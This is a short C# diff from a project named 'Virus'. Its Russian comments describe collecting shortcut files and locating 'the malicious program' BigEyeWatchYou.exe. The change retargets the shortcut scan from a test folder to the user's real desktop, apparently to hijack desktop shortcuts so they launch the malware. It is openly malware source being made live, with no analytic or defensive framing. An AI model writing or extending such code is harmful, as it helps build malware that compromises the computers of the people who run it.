@@ -20,7 +20,7 @@ namespace Virus
             var testFolder = @"C:\Users\New\Desktop\Test";
 
             // Получение файлов ярлыков
-            var files = ShellLinkHelper.GetAllShellLinkFiles(testFolder);
+            var files = ShellLinkHelper.GetAllShellLinkFiles(desktopFolder);
 
             // Получение абсолютного пути к вредоносной программе
             var targetPath = Path.GetFullPath("BigEyeWatchYou.exe");
